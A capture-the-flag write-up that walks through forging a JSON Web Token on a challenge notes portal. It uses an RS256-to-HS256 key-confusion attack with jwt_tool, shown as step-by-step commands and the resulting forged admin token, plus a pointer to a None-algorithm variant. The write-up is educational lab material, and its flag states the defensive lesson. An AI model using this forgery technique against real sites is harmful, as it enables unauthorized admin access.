# Day 14 - JWT

Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.

## Write-Up
For this challenge we are given a link to some kind of web portal containing notes. We are greeted with a login page, where we have login credentials shown. Information also indicate that there is an *admin* account, but the password is redacted.

![](./images/image01.png)

Logging in we see that there are very little info. But at the bottom we see a link *Verify your key*, which is a link to a public key, *jwtRS256.key.pub*

![](./images/image02.png)

The challenge indicate JWT, Json Web Token, is the subject we should look into today.

Looking at the *cookie* we have after logging in, we find 

![](./images/image03.png)

To learn more about JWT we can lookup https://jwt.io/introduction. The structure of a JWT is:

- Header
- Payload
- Signature

The *header* and *payload* are Base64 encoded JSON strings, and the *signature* is the *header* and *payload* signed with an algorithm avaiable using a *secret*. As an example if using the *HMAC SHA256* algorithm.

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```
The JWT token is these three Base64-URL safe strings separated by dots.

Let's decode our JWT token and see what kind of info that is stored.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGP
aq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G
-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TD
nQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQP
HTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJV
eDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp
82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO
6vJME
```

The *header* tells us that the algorithm used is *RS256*.

```
$ echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9' | base64 -d                                    
{"typ":"JWT","alg":"RS256"} 
```

The *payload* tells us that the only thing in this token is a *username* and as we are logged in as "test" this is shown in the token. The decoding of the elements gives us an *invalid input* because the padding has been stripped from the token.

```
$ echo eyJ1c2VybmFtZSI6InRlc3QifQ | base64 -d
{"username":"test"}base64: invalid input

$ echo eyJ1c2VybmFtZSI6InRlc3QifQ== | base64 -d
{"username":"test"}
```

As our only other known username is *admin*, our challenge should be to get logged in as this user. By changing the JWT token this should be possible... We just have to find a way to do this.

Google'ing *JWT attacks* should give many interesting articles to read. From the simple *The None Algorithm* to more complex *JWT Key Confusion*.

*The None Algoritm* attack is in short using alg=none, and stripping of the signature. And if vulnerable the token verification is successful.

As we see that the algorithm used in our token is *RS256* and we also have a public key to verify the token, my guess it that this is a hint for us to notice.

The *RS256* alg, based on RSA with SHA256, is an asymmetric algorithm that uses a private key to sign the token and a public key to verify the signature. As we have the public key, we may verify the token, but are not able to sign tokens. Another alg, *HS256*, based on HMAC with SHA256, is an symmetric algorithm that uses one key for signing and validating.

**"May we be able to trick the site to accept another Alg?"**

Let us try this... Someone has been kind and explained what we need to do and how: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md#jwt-signature---rs256-to-hs256)

This method works like a charm, but consist of many manual steps. Let's also look at a nice tool which also makes this a bit simpler, *jwt_tool*, Ref: https://github.com/ticarpi/jwt_tool

![](./images/image05.png)

*jwt_tool* has many options, but let's get to work as we should have what we need.

- JWT Token, which need to be tampered with
- Public Key, which we will use to sign our new JWT token

Step 1 - Tamper with our initial JWT Token; username = admin
```
$ ~/utils/jwt_tool.py -T "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY
7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lX
p1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf
1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_
dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvA
Y2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYk
bn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31Jd
ghbsgPufM_z3GD1HSfBaMUpUSO6vJME"
```
```
Token payload values:
[1] username = "test"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of username is: test
Please enter new value and hit ENTER
> admin
[1] username = "admin"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step
```
Continuing the final steps will output a new JWT Token which we will use in the next step. 

Step 2 - We will try to exploit the *key confusion* and sign the token with the public key. *-X k*
 option for exploit and *-pk* to provide public key for signing.
```
$ ~/utils/jwt_tool/jwt_tool.py -X k -pk ./jwtRS256.key.pub "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2Vyb
mFtZSI6ImFkbWluIn0.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbyl
Sxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_
q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMK
uBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtl
Gwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX
7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpo
dAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME"
```
```
File loaded: ./jwtRS256.key.pub
jwttool_fdb22251b8935227e4fa80260ade8361 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.
gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw
```

We now go back to our browser and change the JWT value to our new token value. A quick reload of the page and we are presented with the flag.

![](./images/image04.png)

## The Flag
RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}